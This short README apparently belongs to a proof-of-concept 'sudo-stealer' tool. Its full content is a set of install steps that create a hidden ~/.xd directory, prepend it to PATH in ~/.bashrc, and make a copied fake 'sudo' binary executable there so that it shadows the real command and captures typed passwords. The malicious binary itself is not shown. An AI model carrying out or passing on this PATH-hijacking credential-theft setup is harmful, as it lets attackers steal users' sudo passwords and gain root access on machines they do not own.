# sudo-stealer
POC of sudo password stealer

Steps:
```
mkdir ~/.xd
```
```
echo "export PATH=~/.xd:\$PATH" >> ~/.bashrc
```
Copy sudo file to ~/.xd/
```
chmod +x ~/.xd/sudo
```
